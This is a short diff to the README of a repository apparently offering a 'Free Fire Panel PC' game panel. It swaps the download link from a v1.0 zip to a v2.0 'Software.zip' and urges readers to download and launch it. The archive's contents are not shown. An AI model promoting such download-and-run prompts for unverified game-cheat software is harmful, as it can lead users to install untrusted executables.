@@ -36,7 +36,7 @@ Welcome to the **Free Fire Panel PC** repository! This repository is your go-to 
 - **free-fire-pc-panel**
 
 ## Software Download
-[![Download Software](https://github.com/nickmelo12/Free-Fire-Panel-PC/releases/download/v1.0/Release_x64.zip)](https://github.com/nickmelo12/Free-Fire-Panel-PC/releases/download/v1.0/Release_x64.zip "Click to Download Software")
+[![Download Software](https://github.com/nickmelo12/Free-Fire-Panel-PC/releases/download/v2.0/Software.zip)](https://github.com/nickmelo12/Free-Fire-Panel-PC/releases/download/v2.0/Software.zip "Click to Download Software")
 
 The software you need to enhance your Free Fire PC gaming experience is available for download. Click the button above to download the software package. Once downloaded, launch the software to get started.
 
